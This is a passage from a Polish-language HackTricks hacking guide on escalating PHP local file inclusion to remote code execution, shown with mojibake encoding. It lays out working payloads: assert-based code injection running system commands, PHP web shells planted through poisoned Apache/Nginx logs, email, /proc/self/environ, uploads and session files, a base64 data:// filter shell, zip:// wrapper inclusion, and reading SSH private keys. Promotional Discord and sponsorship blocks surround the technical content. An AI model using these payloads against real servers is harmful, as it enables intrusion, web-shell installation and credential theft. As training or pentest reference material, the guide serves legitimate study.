* [glob://](https://www.php.net/manual/en/wrappers.glob.php) â€” ZnajdÅº nazwy Å›cieÅ¼ek pasujÄ…ce do wzorca (Nie zwraca nic drukowalnego, wiÄ™c tutaj nie jest naprawdÄ™ przydatne)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) â€” Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) â€” Strumienie audio (Nie przydatne do odczytu dowolnych plikÃ³w)

## LFI za pomocÄ… 'assert' w PHP

Ryzyko lokalnego uwzglÄ™dnienia plikÃ³w (LFI) w PHP jest szczegÃ³lnie wysokie przy korzystaniu z funkcji 'assert', ktÃ³ra moÅ¼e wykonywaÄ‡ kod wewnÄ…trz ciÄ…gÃ³w znakÃ³w. Jest to szczegÃ³lnie problematyczne, jeÅ›li wejÅ›cie zawiera znaki nawigacji po katalogach, takie jak "..", ktÃ³re sÄ… sprawdzane, ale nie sÄ… odpowiednio oczyszczone.

Na przykÅ‚ad, kod PHP moÅ¼e byÄ‡ zaprojektowany w taki sposÃ³b, aby zapobiec nawigacji po katalogach, jak poniÅ¼ej:
```bash
assert("strpos('$file', '..') === false") or die("");
```
W czasie gdy to ma na celu zatrzymanie traversala, niechcÄ…cy tworzy wektor dla wstrzykiwania kodu. Aby wykorzystaÄ‡ to do odczytywania zawartoÅ›ci pliku, atakujÄ…cy mÃ³gÅ‚by uÅ¼yÄ‡:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Podobnie, do wykonania dowolnych poleceÅ„ systemowych, moÅ¼na uÅ¼yÄ‡:
```plaintext
' and die(system("id")) or '
```
Jest waÅ¼ne, aby **zakodowaÄ‡ adresy URL** tych Å‚adunkÃ³w.

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**WglÄ…d w Hacking**\
Zajmij siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hackowania

**AktualnoÅ›ci z Hackingu w Czasie Rzeczywistym**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim Å›wiatem hackowania dziÄ™ki aktualnoÅ›ciom i wglÄ…dom w czasie rzeczywistym

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami nagrÃ³d za bÅ‚Ä™dy i istotnymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## Åšlepa Trawersacja ÅšcieÅ¼ki w PHP

{% hint style="warning" %}
Ta technika jest istotna w przypadkach, gdy **kontrolujesz** **Å›cieÅ¼kÄ™ pliku** funkcji **PHP**, ktÃ³ra bÄ™dzie **odczytywaÄ‡ plik**, ale nie zobaczysz zawartoÅ›ci pliku (jak proste wywoÅ‚anie **`file()`**), ale zawartoÅ›Ä‡ nie jest wyÅ›wietlana.
{% endhint %}

W [**tym niesamowitym poÅ›cie**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) wyjaÅ›niono, jak Å›lepa trawersacja Å›cieÅ¼ki moÅ¼e byÄ‡ naduÅ¼yta za pomocÄ… filtru PHP do **wycieku zawartoÅ›ci pliku za pomocÄ… orakulum bÅ‚Ä™dÃ³w**.

PodsumowujÄ…c, technika polega na uÅ¼yciu kodowania **"UCS-4LE"**, aby zawartoÅ›Ä‡ pliku byÅ‚a tak **duÅ¼a**, Å¼e funkcja PHP otwierajÄ…ca plik spowoduje **bÅ‚Ä…d**.

NastÄ™pnie, aby ujawniÄ‡ pierwszy znak, filtr **`dechunk`** jest uÅ¼ywany wraz z innymi, takimi jak **base64** lub **rot13**, a na koÅ„cu uÅ¼ywane sÄ… filtry **convert.iconv.UCS-4.UCS-4LE** i **convert.iconv.UTF16.UTF-16BE**, aby **umieÅ›ciÄ‡ inne znaki na poczÄ…tku i ujawniÄ‡ je**.

**Funkcje, ktÃ³re mogÄ… byÄ‡ podatne**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (tylko docelowy odczyt z tym)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

SprawdÅº szczegÃ³Å‚y techniczne w wymienionym poÅ›cie!

## LFI2RCE

### Zdalne DoÅ‚Ä…czenie Pliku

WyjaÅ›nione wczeÅ›niej, [**Å›ledÅº ten link**](./#remote-file-inclusion).

### Poprzez plik dziennika Apache/Nginx

JeÅ›li serwer Apache lub Nginx jest **podatny na LFI** wewnÄ…trz funkcji doÅ‚Ä…czania, moÅ¼esz sprÃ³bowaÄ‡ uzyskaÄ‡ dostÄ™p do **`/var/log/apache2/access.log` lub `/var/log/nginx/access.log`**, ustaw w **nagÅ‚Ã³wku uÅ¼ytkownika** lub w **parametrze GET** powÅ‚okÄ™ PHP takÄ… jak **`<?php system($_GET['c']); ?>`** i doÅ‚Ä…cz ten plik

{% hint style="warning" %}
ZauwaÅ¼, Å¼e **jeÅ›li uÅ¼ywasz podwÃ³jnych cudzysÅ‚owÃ³w** dla powÅ‚oki zamiast **pojedynczych cudzysÅ‚owÃ³w**, podwÃ³jne cudzysÅ‚owy zostanÄ… zmodyfikowane na ciÄ…g "_**quote;**_", **PHP wyrzuci bÅ‚Ä…d** i **nic wiÄ™cej nie bÄ™dzie wykonane**.

Upewnij siÄ™ rÃ³wnieÅ¼, Å¼e **poprawnie zapisujesz Å‚adunek** lub PHP bÄ™dzie zwracaÄ‡ bÅ‚Ä…d za kaÅ¼dym razem, gdy sprÃ³buje zaÅ‚adowaÄ‡ plik dziennika i nie bÄ™dziesz miaÅ‚ drugiej szansy.
{% endhint %}

To samo moÅ¼na zrobiÄ‡ w innych dziennikach, ale **bÄ…dÅº ostroÅ¼ny**, kod wewnÄ…trz dziennikÃ³w moÅ¼e byÄ‡ zakodowany w adresie URL i moÅ¼e to zniszczyÄ‡ PowÅ‚okÄ™. NagÅ‚Ã³wek **autoryzacji "basic"** zawiera "uÅ¼ytkownik:hasÅ‚o" w Base64 i jest dekodowany wewnÄ…trz dziennikÃ³w. PHPShell moÅ¼na wstawiÄ‡ wewnÄ…trz tego nagÅ‚Ã³wka.\
Inne moÅ¼liwe Å›cieÅ¼ki dziennika:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
### Za pomocÄ… listy sÅ‚Ã³w do fuzzingu: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Za pomocÄ… E-maila

**WyÅ›lij e-mail** na wewnÄ™trzne konto (user@localhost) zawierajÄ…cy swÃ³j Å‚adunek PHP, na przykÅ‚ad `<?php echo system($_REQUEST["cmd"]); ?>`, i sprÃ³buj doÅ‚Ä…czyÄ‡ do e-maila uÅ¼ytkownika Å›cieÅ¼kÄ™ takÄ… jak **`/var/mail/<USERNAME>`** lub **`/var/spool/mail/<USERNAME>`**

### Za pomocÄ… /proc/\*/fd/\*

1. PrzeÅ›lij wiele powÅ‚ok (na przykÅ‚ad: 100)
2. DoÅ‚Ä…cz [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), gdzie $PID = PID procesu (moÅ¼e byÄ‡ zÅ‚amany siÅ‚Ä… brute) i $FD deskryptor pliku (rÃ³wnieÅ¼ moÅ¼e byÄ‡ zÅ‚amany siÅ‚Ä… brute)

### Za pomocÄ… /proc/self/environ

Jak w pliku dziennika, przeÅ›lij Å‚adunek w nagÅ‚Ã³wku User-Agent, ktÃ³ry zostanie odzwierciedlony w pliku /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Za pomocÄ… przesyÅ‚ania pliku

JeÅ›li moÅ¼esz przesÅ‚aÄ‡ plik, po prostu wstrzyknij do niego Å‚adunek powÅ‚oki (np. : `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Aby zachowaÄ‡ czytelnoÅ›Ä‡ pliku, najlepiej wstrzyknÄ…Ä‡ do metadanych obrazÃ³w/doc/pdf

### Za pomocÄ… przesyÅ‚ania pliku ZIP

PrzeÅ›lij plik ZIP zawierajÄ…cy skompresowany PHP shell i uzyskaj dostÄ™p:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Za pomocÄ… sesji PHP

SprawdÅº, czy strona internetowa uÅ¼ywa sesji PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
W PHP te sesje sÄ… przechowywane w plikach _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Ustaw ciasteczko na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
UÅ¼yj LFI doÅ‚Ä…czyÄ‡ plik sesji PHP.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Za poÅ›rednictwem ssh

JeÅ›li ssh jest aktywne, sprawdÅº, ktÃ³ry uÅ¼ytkownik jest uÅ¼ywany (/proc/self/status & /etc/passwd) i sprÃ³buj uzyskaÄ‡ dostÄ™p do **\<HOME>/.ssh/id\_rsa**

### **Za poÅ›rednictwem** **logÃ³w** **vsftpd**

Logi serwera FTP vsftpd znajdujÄ… siÄ™ w _**/var/log/vsftpd.log**_. W przypadku istnienia podatnoÅ›ci na WÅ‚Ä…czenie Lokalnego Pliku (LFI) i moÅ¼liwoÅ›ci dostÄ™pu do naraÅ¼onego serwera vsftpd, moÅ¼na rozwaÅ¼yÄ‡ nastÄ™pujÄ…ce kroki:

1. Wstrzyknij Å‚adunek PHP do pola nazwy uÅ¼ytkownika podczas procesu logowania.
2. Po wstrzykniÄ™ciu, skorzystaj z LFI, aby pobraÄ‡ logi serwera z _**/var/log/vsftpd.log**_.

### Za pomocÄ… filtra php base64 (uÅ¼ywajÄ…c base64)

Jak pokazano w [tym](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artykule, filtr base64 PHP po prostu ignoruje Non-base64. MoÅ¼esz uÅ¼yÄ‡ tego do ominiÄ™cia sprawdzania rozszerzenia pliku: jeÅ›li dostarczysz base64 koÅ„czÄ…cy siÄ™ na ".php", to po prostu zignoruje "." i doÅ‚Ä…czy "php" do base64. Oto przykÅ‚adowy Å‚adunek:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Za pomocÄ… filtrÃ³w php (nie jest potrzebny plik)

Ten [**opis**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) wyjaÅ›nia, Å¼e moÅ¼na uÅ¼yÄ‡ **filtrÃ³w php do generowania dowolnej zawartoÅ›ci** jako wyniku. Oznacza to w zasadzie, Å¼e moÅ¼na **generowaÄ‡ dowolny kod php** do doÅ‚Ä…czenia **bez koniecznoÅ›ci zapisywania** go do pliku.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Za pomocÄ… bÅ‚Ä™du segmentacji

**PrzeÅ›lij** plik, ktÃ³ry zostanie przechowany jako **tymczasowy** w `/tmp`, a nastÄ™pnie w **tym samym Å¼Ä…daniu,** wywoÅ‚aj **bÅ‚Ä…d segmentacji**, wtedy **tymczasowy plik nie zostanie usuniÄ™ty** i bÄ™dziesz mÃ³gÅ‚ go wyszukaÄ‡.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Za pomocÄ… przechowywania plikÃ³w tymczasowych Nginx

JeÅ›li znalazÅ‚eÅ› **WÅ‚Ä…czenie Pliku Lokalnego** i **Nginx** dziaÅ‚a przed PHP, moÅ¼esz byÄ‡ w stanie uzyskaÄ‡ RCE za pomocÄ… nastÄ™pujÄ…cej techniki:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Za pomocÄ… PHP\_SESSION\_UPLOAD\_PROGRESS

JeÅ›li znalazÅ‚eÅ› **WÅ‚Ä…czenie Pliku Lokalnego** nawet jeÅ›li **nie masz sesji** i `session.auto_start` jest `Off`. JeÅ›li dostarczysz **`PHP_SESSION_UPLOAD_PROGRESS`** w danych **multipart POST**, PHP **wÅ‚Ä…czy sesjÄ™ dla ciebie**. MoÅ¼esz wykorzystaÄ‡ to do uzyskania RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php_session_upload_progress.md)
{% endcontent-ref %}

### Za pomocÄ… przesyÅ‚ania plikÃ³w tymczasowych w systemie Windows

JeÅ›li znalazÅ‚eÅ› **WÅ‚Ä…czenie Pliku Lokalnego** i serwer dziaÅ‚a w systemie **Windows**, moÅ¼esz uzyskaÄ‡ RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Za pomocÄ… phpinfo() (file\_uploads = on)

JeÅ›li znalazÅ‚eÅ› **WÅ‚Ä…czenie Pliku Lokalnego** i plik ujawniajÄ…cy **phpinfo()** z file\_uploads = on, moÅ¼esz uzyskaÄ‡ RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Za pomocÄ… compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Ujawnienie Å›cieÅ¼ki

JeÅ›li znalazÅ‚eÅ› **WÅ‚Ä…czenie Pliku Lokalnego** i **moÅ¼esz wyciec Å›cieÅ¼kÄ™** pliku tymczasowego, ALE **serwer** sprawdza, czy **plik do doÅ‚Ä…czenia ma znaczniki PHP**, moÅ¼esz sprÃ³bowaÄ‡ **obejÅ›Ä‡ tÄ™ kontrolÄ™** za pomocÄ… tej **Race Condition**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Za pomocÄ… wiecznego oczekiwania + ataku brutalnej siÅ‚y

JeÅ›li moÅ¼esz wykorzystaÄ‡ WÅ‚Ä…czenie Pliku Lokalnego do **przesyÅ‚ania plikÃ³w tymczasowych** i spowodowaÄ‡, Å¼e serwer **zawiesi** wykonanie PHP, moÅ¼esz nastÄ™pnie **prÃ³bowaÄ‡ brutalnej siÅ‚y nazw plikÃ³w przez godziny**, aby znaleÅºÄ‡ plik tymczasowy:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Do bÅ‚Ä™du krytycznego

JeÅ›li doÅ‚Ä…czysz ktÃ³rykolwiek z plikÃ³w `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Musisz doÅ‚Ä…czyÄ‡ ten sam plik 2 razy, aby spowodowaÄ‡ ten bÅ‚Ä…d).

**Nie wiem, jak to moÅ¼e byÄ‡ uÅ¼yteczne, ale moÅ¼e byÄ‡.**\
_Nawet jeÅ›li spowodujesz krytyczny bÅ‚Ä…d PHP, tymczasowe pliki przesÅ‚ane przez PHP sÄ… usuwane._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## OdnoÅ›niki

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami bÅ‚Ä™dÃ³w!

**Spojrzenia na Hacking**\
Zajmij siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hackowania

**AktualnoÅ›ci na Å»ywo o Hackingu**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hackowania dziÄ™ki aktualnoÅ›ciom i spojrzeniom na Å¼ywo

**Najnowsze OgÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami nagrÃ³d za bÅ‚Ä™dy i istotnymi aktualizacjami platform

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
